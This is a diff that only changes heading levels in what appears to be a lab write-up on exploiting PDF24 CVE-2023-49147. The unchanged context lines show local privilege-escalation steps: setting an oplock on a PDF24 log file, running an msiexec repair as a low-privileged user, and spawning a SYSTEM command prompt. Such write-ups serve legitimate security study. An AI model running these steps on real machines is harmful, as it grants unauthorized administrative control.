@@ -1109,7 +1109,7 @@ If we open the PDF24 Launcher shortcut and click on the about button, we can che
 
 <br />
 
-# PDF24 - CVE-2023-49147
+## PDF24 - CVE-2023-49147
 
 <br />
 
@@ -1121,7 +1121,7 @@ This version is vulnerable to [CVE-2023-49147](https://nvd.nist.gov/vuln/detail/
 
 <br />
 
-## Exploitation
+### Exploitation
 
 <br />
 
@@ -1129,7 +1129,7 @@ To exploit this we will follow step by step the awesome POC of the following [we
 
 <br />
 
-### Step 1 - Set a OpLock in the log file.
+#### Step 1 - Set a OpLock in the log file.
 
 <br />
 
@@ -1149,7 +1149,7 @@ SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
 
 <br />
 
-### Step 2 - Start the repair process as low-privileged user.
+#### Step 2 - Start the repair process as low-privileged user.
 
 <br />
 
@@ -1171,7 +1171,7 @@ msiexec.exe /fa "C:\_install\pdf24-creator-11.15.1-x64.msi"
 
 <br />
 
-### Step 3 - Spawn a SYSTEM cmd.exe process:
+#### Step 3 - Spawn a SYSTEM cmd.exe process:
 
 <br />
 
